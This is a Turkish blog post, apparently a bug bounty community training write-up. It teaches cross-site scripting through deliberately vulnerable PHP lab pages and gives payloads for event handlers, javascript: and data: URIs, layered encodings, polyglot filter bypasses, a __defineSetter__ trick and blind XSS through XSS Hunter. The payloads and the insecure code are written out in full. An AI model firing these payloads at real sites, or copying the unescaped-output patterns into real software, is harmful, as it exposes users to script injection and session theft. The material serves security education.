---
title: Gallipoli Bug Bounty Community Task 2
date: 2024-07-19T15:51:46+03:00
tags: ["web", "xss", "bug"]

cover:
  image: "img/task2/task2-cover.webp"
  alt: "xss cover"
  # caption: "caption"
---

#### Not: Bu araştırma benim ve Ahmet Faruk Albayrak'ın ortak çalışmasıdır. Kendisinin blogunu [burada](https://far-jute-5c7.notion.site/Event-Handlers-Protocols-HTML-Tags-Encoding-Obfuscation-Polyglot-Noscript-Blind-XSS-Test-En-2434c4f3505e4c6898f125733ddbfc5e) bulabilirsiniz.

#### Not: Doğru bilinen yanlışlar doğrusu öğrenilince düzeltilecektir.

#### Test ortamlarının tamamına ulaşmak için: [link](http://35.187.63.168/index.html)

---

# Event Handler ile XSS Attack

### Event Handler Nedir?

[Test ortamı](http://35.187.63.168/task2/event-handlers/index.php)

Event handler'lar, HTML elementleri üzerinde çeşitli olayları (event) yakalayan ve yanıt veren JavaScript kodlarıdır. En yaygın event handler'lar şunlardır:
<br>
- `onclick`: Bir öğeye tıklanıldığında çalışır.
<br>
- `onload`: Bir öğe yüklendiğinde çalışır.
<br>
- `onerror`: Bir hata oluştuğunda çalışır.
<br>
- `onfocus`: Bir öğe odaklandığında çalışır.
<br>
- `onchange`: Bir öğe değiştirildiğinde çalışır.
<br>
- `onplay`: Medya öğesi oynarken tetiklenir.

Event handler'lar, kötü niyetli kodların web sayfasında çalıştırılmasına olanak tanıyabilir, bu da XSS saldırılarının uygulanmasına neden olabilir.

Örneklerle inceleyelim.

### img tag & onerror event:

```php
$decoded = urldecode($userInput);
echo "<img src=\"" . $decoded . "\">";
```

**Payload:** `%2522%2520onerror=%2522alert()`

`%2522` iki kez encode edilmiş `"` karakteridir. İlk encode işleminde `%22` olur, ikinci encode işleminde `%2522` olur.
Çalışma: `onerror eventi`, resim yüklenemezse tetiklenir. Kullanıcı `img` etiketi için URL olarak `%2522%2520onerror=%2522alert()` gibi bir değer girerse, bu değer iki kez decode edilerek `"%20onerror="alert()` olur. Bu, `onerror eventini` tetikler ve `alert('XSS')` çalıştırır.

### svg tag & onload event:

```php
$replaced = str_replace(">", "&gt;", $userInput);
echo "<svg height=\"" . $replaced . "\" width=\"100\" xmlns=\"http://www.w3.org/2000/svg\">
  <circle r=\"45\" cx=\"50\" cy=\"50\" stroke=\"green\" stroke-width=\"3\" fill=\"red\" \"/>
</svg>";
```

**Payload:** `%22+onload=%22alert()`

Encode: `%22` karakteri `"` ile aynı şeydir, `+onload=%22alert()` kısmı ise `onload eventine` alert`('XSS')` atar.
Çalışma: Kullanıcı `SVG` etiketinin height özelliğine `%22+onload=%22alert()` gibi bir değer girerse, bu değer HTML encode edilmez ve `onload eventi` tetiklenir, `alert('XSS')` çalıştırılır.

### Double Encoded Payload & onloadstart

```php
$ddecoded = urldecode(urldecode($userInput));
echo "<video src=\"" . $ddecoded . "\" autoplay></video>";
```

**Payload:** `%2522%2520onloadstart=%2522alert()`

Çift URL Encode: `%2522` iki kez URL encode edilmiştir. İlk decode işlemi `%22` sonucunu verir, ikinci decode işlemi ise `"` karakterini geri getirir.
Çalışma: Video etiketine çift encode edilmiş payload girildiğinde, bu payload iki kez decode edilerek `onloadstart="alert()` olur. `onloadstart eventi` tetiklenir ve `alert('XSS')` çalıştırılır.

### audio tag & onplay event:

```php
echo "<audio src=\"" . $userInput . "\" autoplay></audio>";
```

**Payload:** `sound.mp3" onplay="alert()`

Payload: Burada `onplay eventi`, `audio` etiketine eklenecek bir JavaScript kodu içerir.
Çalışma: Kullanıcı audio etiketinin `src` özelliğine `sound.mp3" onplay="alert()` gibi bir değer girerse, `onplay event` tetiklenir ve `alert('XSS')` çalıştırılır.

### a tag & onfocus event:

```php
echo "<a href=\"" . $userInput . "\" autofocus>Link</a>";
```

**Payload:** `"+onfocus="javascript:alert()`

Payload: `onfocus eventine` JavaScript kodu atanmıştır.
Çalışma: Kullanıcı `a` etiketinin `href` özelliğine `"+onfocus="javascript:alert()` gibi bir değer girerse, `onfocus eventi` tetiklenir ve `javascript:alert('XSS')` çalıştırılır.

### button tag & onclick event (Base64 Encoded):

```php
$replaced2 = str_replace("\"", "", $userInput);
echo "<button type=\"submit\" formaction=\"" . base64_decode($replaced2) . "\">Click</button>";
```

**Payload:** IiBvbmNsaWNrPSJhbGVydCgp

Base64 Encode: `IiBvbmNsaWNrPSJhbGVydCgp` base64 encode edilmiş `onclick="alert()"` kodunu temsil eder.
Çalışma: Kullanıcı button etiketinin `formaction` özelliğine base64 encode edilmiş payload girerse, bu değer base64 decode edilerek `onclick="alert()" `olur. `onclick event` tetiklenir ve `alert('XSS')` çalıştırılır.

### input tag & onchange event:

```php
echo "<input type=\"text\" placeholder=\"" . $userInput . "\" />";
```

**Payload:** %22+onchange=%22alert()
Encode: `%22` karakteri `"` ile aynı şeydir, `+onchange=%22alert()` kısmı ise `onchange eventine` `alert('XSS')` atar.
Çalışma: Kullanıcı `input` etiketinin `placeholder` özelliğine `%22+onchange=%22alert()` gibi bir değer girerse, bu değer HTML encode edilmez ve `onchange eventi` tetiklenir, `alert('XSS')` çalıştırılır.

**Sonuç olarak Event handler'lar, web sayfalarında XSS saldırıları gerçekleştirmek için potansiyel bir vektör sunar. Kullanıcıdan alınan verilerin event handler'lar içinde işlenmesi, kötü niyetli JavaScript kodlarının çalışmasına neden olabilir.**

---

# URI Scheme & Protocol ile XSS Attack

[Test ortamı](http://35.187.63.168/task2/protocol-tag/index.php)

Web uygulamalarında güvenlik açıkları, çeşitli yollarla ortaya çıkabilir ve URI (Uniform Resource Identifier) şemaları bu açıdan önemli bir riski temsil eder. URI şemaları, bir URL'nin protokol kısmını belirleyerek çeşitli türde kaynaklara erişim sağlar. Ancak, URI şemaları kötü niyetli kullanıcılar tarafından XSS saldırıları için kullanılabilir. Burada, URI şemalarının nasıl XSS saldırılarına neden olabileceğini ve belirli örnekler üzerinden bu zaafiyetlerin nasıl tetiklendiğini inceleyeceğiz.

### iframe tag ile javascript: URI Scheme

```php
<iframe src=\"" . $userInput . "\"></iframe>
```

**Paylaod**

```
javascript:alert(0)
```

**Nasıl Çalışır:** `src` özniteliği javascript protokolünü adres olarak tanır, frame açmaya çalışınca ve alert tetiklenir.

### iframe tag ile data:text URI Scheme

```php
<iframe src=\"" . $userInput . "\"></iframe>
```

**Paylaod**

```
data:text/html;base64,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==
```

**Nasıl Çalışır:** `src` özniteliği data protokolünü adres olarak tanır, frame açmaya çalışınca ve base64 içinde yazan payload tetiklenir.

### iframe tag ile data:image URI Scheme

```php
<iframe src=\"" . $userInput . "\"></iframe>
```

**Paylaod**

```
data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ1hTUycpPC9zY3JpcHQ+PC9zdmc+
```

**Nasıl Çalışır:** `src` özniteliği data protokolünü adres olarak tanır, frame açmaya çalışınca ve base64 içinde yazan payload tetiklenir.


### embed tag ile javascript: URI Scheme

```php
<embed src="$userInput"></embed>
```

**Paylaod**

```
data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ1hTUycpPC9zY3JpcHQ+PC9zdmc+
```

**Nasıl Çalışır:** embed tag'ı kullanılarak base64 kodlanmış HTML içeriği yüklenir. Bu içerikte JavaScript kodları çalıştırılabilir. Fitreleme olmadığı için xss saldırısına yol açar. 

### embed tag ile data:image URI Scheme

```php
<embed src="$userInput"></embed>
```

**Paylaod**

```
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

**Nasıl Çalışır:** embed tag'ı kullanılarak base64 kodlanmış HTML içeriği yüklenir. Bu içerikte JavaScript kodları çalıştırılabilir. Fitreleme olmadığı için xss saldırısına yol açar.

### embed tag ile data:text URI Scheme

```php
<embed src="$userInput"></embed>
```

**Paylaod**

```
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

**Nasıl Çalışır:** embed tag'ı kullanılarak base64 kodlanmış HTML içeriği yüklenir. Bu içerikte JavaScript kodları çalıştırılabilir. Fitreleme olmadığı için xss saldırısına yol açar.

### object tag ile javascript: URI Scheme

```php
<object data=\"". $userInput . "\"></object>
```

**Paylaod**

```
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

**Nasıl Çalışır:** object tag'ı kullanılarak base64 kodlanmış HTML içeriği yüklenir. Bu içerikte JavaScript kodları çalıştırılabilir. Fitreleme olmadığı için xss saldırısına yol açar.


### a href ile javascript: URI Scheme

```php
<a href=\"" . $userInput . "\">LINK</a>
```

**Paylaod**

```js
javascript:alert(0);
```

**Nasıl Çalışır:** javascript: URI şeması, JavaScript kodlarını çalıştırmak için kullanılır. Bu kodlar linke tıklanmasıyla çalıştırılabilir.

Sonuç olarak URI şemaları, XSS saldırılarına karşı hassas bir alan olabilir. Kullanıcı girdi verilerini doğru şekilde işlemek, filtrelemek ve kodlamak, XSS risklerini minimize etmek için kritik öneme sahiptir.

---

# Encoding & Obfuscating ile XSS Attack

[Test ortamı](http://35.187.63.168/task2/encoding-obfuscating/index.php)

HTML ve PHP kullanarak XSS saldırılarına karşı yapılan encoding ve obfuscation tekniklerini inceleyeceğiz. Bu kod, kullanıcıdan çeşitli encoding türlerinde veri alır ve veriyi uygun şekilde decode edip ekrana yazar. Ancak, encoding ve obfuscation yöntemleri bazen güvenlik açıklarını gizleyebilir ve bu da XSS saldırılarına yol açabilir. Her bir encoding ve obfuscation yöntemi ile ilgili detayları ele alarak, nasıl ve neden tetiklendiklerini açıklayacağız.

### Base64 Encoding

```php
<form action="" method="GET">
  <input type="text" name="inputB64" required />
  <button type="submit">Base64</button>
</form>

if (isset($params['inputB64'])) {
  $b64decoded = base64_decode($params['inputB64']);
  echo "<p style='display: none;'>" . $b64decoded . "</p>";
}
```

**Base64 Encoded Payload**

```
PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+
```

**Nasıl Çalışır:** base64_decode fonksiyonu kullanılarak base64 encoded veri decode edilir sonrasında ekrana yazdırılır. Payload, script etiketini içerir ve base64 decode edildikten sonra, JavaScript kodu çalıştırmak için tetiklenir.

**Zaafiyet:** Base64 encoding, veri yükünü şifrelemez, sadece kodlar. Eğer base64 encoded veri doğru şekilde decode edilip çalıştırılabilirse, XSS saldırısı gerçekleştirilebilir.

### URL Encoding

```php
<form action="" method="GET">
  <input type="text" name="inputURL" required />
  <button type="submit">URL Encode</button>
</form>

if (isset($params['inputURL'])) {
  $urldecoded = urldecode($params['inputURL']);
  echo "<p style='display: none;'>" . $urldecoded . "</p>";
}
```

**URL Encoded Payload**

```html
%3Cscript%3Ealert()%3C/script%3E
```

**Nasıl Çalışır:** urldecode fonksiyonu URL encoded veriyi decode eder ve veri ekrana yazdırılır. Payload, script etiketini içerir ve URL decode edildikten sonra, JavaScript kodu çalıştırmak için tetiklenir.

**Zaafiyet:** URL encoding, bazı karakterlerin özel anlamını gizler, ancak bu karakterler decode edildikten sonra yine de XSS saldırılarına yol açabilir.

### HTML Encoding

```php
<form action="" method="GET">
  <input type="text" name="inputHTML" required />
  <button type="submit">HTML Encode</button>
</form>

if (isset($params['inputHTML'])) {
  $htmldecoded = html_entity_decode($params['inputHTML'], ENT_QUOTES | ENT_HTML5);
  echo "<p style='display: none;'>" . $htmldecoded . "</p>";
}
```

**HTML Encoded Payload**

```html
&lt;script&gt;alert()&lt;/script&gt;
```

**Nasıl Çalışır:** html_entity_decode fonksiyonu HTML encoded veri decode eder ardından veri ekrana yazdırılır. Payload, HTML karakterleri kodlanmış olarak gönderilir, ancak bu karakterler decode edildikten sonra JavaScript kodunu tetikler.

**Zaafiyet:** HTML encoding, karakterlerin özel HTML anlamlarını gizler, ancak bu karakterler decode edildikten sonra yine de XSS saldırılarına yol açabilir.

### Base64 & HTML Encoding

```php
<form action="" method="GET">
  <input type="text" name="inputB64HTML" required />
  <button type="submit">Base64 & HTML Encode</button>
</form>

if (isset($params['inputB64HTML'])) {
  $b64htmldecoded = html_entity_decode(base64_decode($params['inputB64HTML']), ENT_QUOTES | ENT_HTML5);
  echo "<p style='display: none;'>" . $b64htmldecoded . "</p>";
}
```

**Base64 & HTML Encoded Payload**

```
Jmx0O3NjcmlwdCZndDthbGVydCZscGFyOyZycGFyOyZsdDsmc29sO3NjcmlwdCZndDs=
```

**Nasıl Çalışır:** base64_decode ve html_entity_decode fonksiyonları, base64 ve HTML encoded veriyi sırasıyla decode eder. Payload, önce base64 decode edilir, ardından HTML entity'leri decode edilir ve JavaScript kodunu tetikler.

**Zaafiyet:** Bu yöntem, hem base64 hem de HTML encoding kullanarak veri gizlemeyi amaçlar, ancak doğru decode edilirse XSS saldırısına açık olabilir.

### Base64 & URL Encoding

```php
<form action="" method="GET">
  <input type="text" name="inputB64URL" required />
  <button type="submit">Base64 & URL Encode</button>
</form>

if (isset($params['inputB64URL'])) {
  $b64urldecoded = urldecode(base64_decode($params['inputB64URL']));
  echo "<p style='display: none;'>" . $b64urldecoded . "</p>";
}
```

**Base64 & URL Encoded Payload**

```
JTNDc2NyaXB0JTNFYWxlcnQoKSUzQy9zY3JpcHQlM0U=
```

**Nasıl Çalışır:** base64_decode ve urldecode fonksiyonları, base64 ve URL encoded veriyi sırasıyla decode eder. Payload, önce base64 decode edilir, ardından URL decode edilir ve JavaScript kodunu tetikler.

**Zaafiyet:** URL encoding ve base64 encoding kombinasyonu, XSS payload'larının gizlenmesine yardımcı olabilir, ancak doğru decode edilirse XSS saldırısı gerçekleştirebilir.

### HTML & URL Encoding

```php
<form action="" method="GET">
  <input type="text" name="inputHTML4URL" required />
  <button type="submit">HTML & URL Encode</button>
</form>

if (isset($params['inputHTML4URL'])) {
  $htmlurldecoded = urldecode(html_entity_decode($params['inputHTML4URL'], ENT_QUOTES | ENT_HTML5));
  echo "<p style='display: none;'>" . $htmlurldecoded . "</p>";
}
```

**HTML & URL Encoded Payload**

```html
&percnt;3Cscript&percnt;3Ealert&lpar;&rpar;&percnt;3C&sol;script&percnt;3E
```

**Nasıl Çalışır:** html_entity_decode ve urldecode fonksiyonları, HTML ve URL encoded veriyi sırasıyla decode eder. Payload, önce HTML entity'leri decode edilir, ardından URL decode edilir ve JavaScript kodunu tetikler.

**Zaafiyet:** HTML ve URL encoding kombinasyonu, XSS payload'larının gizlenmesini sağlar, ancak doğru şekilde decode edilirse XSS saldırısına yol açabilir.

Bu örneklerde, kodlar farklı encoding türlerini kullanarak kullanıcı girdilerini işlemek için tasarlanmıştır. Ancak, her bir encoding ve obfuscation yöntemi XSS saldırılarına karşı tam bir koruma sağlamaz. Kodlarda kullanılan filtreleme ve encoding teknikleri, bazı XSS payload'larının tetiklenmesini önleyebilirken, diğerleri bu tekniklerden kaçabilir.

---

# Polyglot Payload ile XSS Attack

[Test ortamı](http://35.187.63.168/task2/polyglot/index.php)

PHP ile yazılmış bir web uygulamasında Polyglot XSS saldırılarını inceleyeceğiz. Polyglot XSS attack, farklı XSS vektörlerini birleştirerek birden çok güvenlik katmanını atlatmayı amaçlayan bir saldırı türüdür. Aşağıda verilen kodlar, çeşitli filtreleme fonksiyonları kullanarak kullanıcı girdilerini işlemek için tasarlanmıştır. Bu kodun belirli zafiyetlere sahip olup olmadığını ve bu zafiyetlerin nasıl kullanılabileceğini göreceğiz.

### Test Case 1

```php
<?php
  $userInput = isset($_GET['input']) ? $_GET['input'] : '';

  function filter1($input) {
    $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
    $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
    $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
    $filtered = str_replace(['javascript:', 'expression('], '', $filtered);
    $filtered = str_replace(['iframe', 'eval', 'onload', 'img', 'onclick', 'onmouseout', 'ondblclick'], '', $filtered);
    return $filtered;
  }
  function echo1($str) {
    echo filter1($str);
  }
    echo "<p>" .  htmlspecialchars(echo1($userInput)) . "</p>";
?>
```

**Zafiyet:** filter fonksiyonu çeşitli tehlikeli etiketleri ve olayları kaldırsa da, `svg` ve `onmouseover` gibi bazı önemli XSS vektörlerini yeterince engellemez. Ayrıca, kullanıcı girdisi doğrudan ekrana yazdırılırken HTML özel karakterleri encode edilmez, bu da XSS saldırılarına açık bir durum yaratır.

**Yukarıdaki kodu bypass edecek bir payload**

```html
javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>--><svg style="border:1px solid black" onload=/*<html/*/onmouseover=alert()//>
```

### Test Case 2

```php
<?php
  $userInput = isset($_GET['input']) ? $_GET['input'] : '';

  function filter2($input) {
    $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
    $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
    $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
    $filtered = str_replace(['javascript:', 'expression('], '', $filtered);
    $filtered = str_replace(['iframe', 'eval', 'onclick', 'onmouseover', 'img', 'textarea', 'onclick',  'onmouseout', 'ondblclick'], '', $filtered);
    return $filtered;
  }
    echo "<script>var str =\" " .  filter2($userInput) . "\";</script>";
?>
```

**Filtreleme:** filter fonksiyonu, `onmouseover` ve `textarea` gibi ek XSS vektörlerini de kaldırır. Ayrıca, unsafeEcho fonksiyonu ile çıktı HTML özel karakterleri encode edilir.

**Zaafiyet:** Bu örnekte diğer örnekten farklı olarak `onload` gibi vektörler yeterince filtrelemeyebilir.

**Yukarıdaki kodu bypass edecek bir payload**

```html
javascript:/*"/*`/*'/*\"/*</script></style></template></select></title></textarea></noscript></noembed><<svg/*/ onload=alert()//>
```

### Test Case 3

```php
<?php
  $userInput = isset($_GET['input']) ? $_GET['input'] : '';

  function filter3($input) {
    $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
    $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
    $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
    $filtered = str_replace(['expression('], '', $filtered);
    $filtered = str_replace(['iframe', 'eval', 'onload', 'onmouseover', 'onmouseout', 'ondblclick', 'onclick'], '', $filtered);
    return $filtered;
  }
  echo "<input type='text' placeholder='input a text' value='" . filter3($userInput) . "'>";
?>
```

**Filtreleme:** filter fonksiyonu, `onload` ve `onmouseover` gibi ek XSS vektörlerini de kaldırır. Ancak, hala bazı zafiyetler bulundurmaktadır.

**Zaafiyet:** Bu fonksiyon, belirli URI şemalarını (örneğin javascript:) ve HTML etiketlerini filtrelerken yeterince kapsamlı olmayabilir.

**Yukarıdaki kodu bypass edecek bir payload**

```html
javascript:/*"/*'/*`/*\"/**/ oninput=alert()//*</title></textarea></style></noscript></noembed></template></option></select></SCRIPT>-->
```

### Test Case 4

```php
<?php
  $userInput = isset($_GET['input']) ? $_GET['input'] : '';

  function filter4($input) {
    $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
    $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
    $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
    $filtered = str_replace(['expression('], '', $filtered);
    $filtered = str_replace(['iframe', 'eval', 'onload', 'onmouseover', 'ondblclick'], '', $filtered);
    return $filtered;
  }
  echo "<a href=\"" . filter4($userInput) . "\">set link</a>";
?>
```

**Yukarıdaki kodu bypass edecek bir payload**

```html
jaVasCript:/*-/*`/*\`/*'/*"/*/(/* */ onclick=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe///>\x3e
```

### Test Case 5

```php
<?php
  $userInput = isset($_GET['input']) ? $_GET['input'] : '';

  function filter5($input) {
    $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
    $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
    $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
    $filtered = str_replace(['expression('], '', $filtered);
    $filtered = str_replace(['iframe', 'eval', 'onload', 'onmouseover', 'onclick'], '', $filtered);
    return $filtered;
  }
  echo "add comment line";
  echo "<!--" . filter5($userInput) . "-->";
?>
```

**Yukarıdaki kodu bypass edecek bir payload**

```html
jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */)//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/ondblclick=alert()//>
```

Sonuç olarak Polyglot XSS saldırıları, çeşitli XSS vektörlerini birleştirerek birçok filtreleme katmanını atlatmayı hedefler. Yukarıdaki PHP kodları, farklı filtreleme fonksiyonları kullanarak kullanıcı girdilerini işlemek için tasarlanmıştır. Ancak, her kodun kendine özgü zafiyetleri olma ihtimali gözden kaçırılmamalıdır.

---

# Noscript XSS Filter ByPass & Attack

NoScript XSS saldırıları, JavaScript'in devre dışı bırakıldığı, çalışmadığı veya filtrelendiği durumlarda XSS açıklarını kullanmayı amaçlayan saldırılardır. JavaScript'in esnek doğası, yanlış kullanıldığında ciddi güvenlik açıklarına yol açabilir. Bu yazıda, \_\_defineSetter__ yönteminin XSS zafiyetine nasıl neden olabileceğini inceleyeceğiz.

### \_\_defineSetter__ Nedir?
\_\_defineSetter__ JavaScript'te bir nesnenin özelliğini bir fonksiyona bağlamayı sağlar. Özellik ayarlandığında belirlenen fonksiyon çalışır.

### Genel Kullanım Örneği
```javascript
let obj = {};
obj.__defineSetter__('prop', function(value) {
    console.log('prop set to ' + value);
});
obj.prop = 123;// Konsolda "prop set to 123" mesajı görüntülenmesi beklenir
```

### \_\_defineSetter__ ile XSS Saldırısı
PortSwigger araştırmacılarından Gareth Heyes'in [NoScript XSS filter bypass](https://portswigger.net/research/noscript-xss-filter-bypass) araştırmasında, \_\_defineSetter__ yönteminin XSS filtrelerini nasıl atlatabileceğini göstermektedir. Saldırgan, window nesnesinde bir setter tanımlanarak ve bu özellik ayarlandığında zararlı kod çalıştırarak XSS filtrelerini atlatabilir.

### Saldırı Örneği
```javascript
<script> x = ''.__defineSetter__('x', alert), x = 1, '';</script>
```
- `x` ilk olarak boş bir string olarak atanıyor.
- `__defineSetter__('x',alert)` ile x özelliğine setter atanıyor.
- `x = 1` satırı çalıştığında, x'in değeri değiştiriliyor ve bu değişim `alert` fonksiyonunu tetikliyor.

Modern tarayıclar bu yöntemleri engellese de buna benzer saldırı yüzeyleri bir yerlerde var olmaya ve keşfedilmeye devam edecektir.

---

# Blind XSS Attack

[Test ortamı](http://35.187.63.168/task2/blind-xss/index.php)

Blind XSS, kurbanın saldırının etkilerini doğrudan görmediği XSS saldırılarıdır. Saldırgan, hedef uygulamaya zararlı bir komut veya kod yerleştirir, ancak bu kod hemen çalışmaz; uygulamanın başka bir bölümü tarafından çalıştırıldığında etkisini gösterir. Saldırı girişleri genellikle teknik destek chat alanları, log kayıtları, e-posta bildirimleri veya yönetici panelleri gibi yerlerde tetiklenir.

### Test Case

Örneğimizde feedback için bir input alanı var ve gönderdiğimiz metnin nereye gittiğini bilmiyoruz.
![1](/img/task2/1-page1.png)
Bir veritabanına kaydedilip başka bir sayfada çağırılacağını umuyor ve teste başlıyoruz. Metin yerine XSS payloadı yazarsak ne olacağını merak ediyor ve XSS Hunter uygulamasından bir payload alıyoruz.

![2](/img/task2/2-xsshunter1.png)
Payloadı gönderdikten sonra XSS Hunter uygulamasında bir sonuç bekliyoruz.

Site Admini panele girip feedbackleri kontrol ediyor ve XSS payloadı tetikleniyor.

![3](/img/task2/5-page3.png)

XSS Hunter'a baktığımızda payloadın hedefte tetiklendiğini ve senaryoya bağlı olarak bilgileri ele geçirdiğini görüyoruz.

![4](/img/task2/6-xsshunter3.png)

Bu tür saldırılar, saldırının hemen fark edilmemesi ve genellikle daha derin ve karmaşık güvenlik katmanlarını hedeflemesi nedeniyle daha tehlikelidir. Blind XSS, güvenlik testi ve tespit süreçlerini zorlaştırdığı için özellikle dikkat edilmesi gereken bir güvenlik açığıdır.
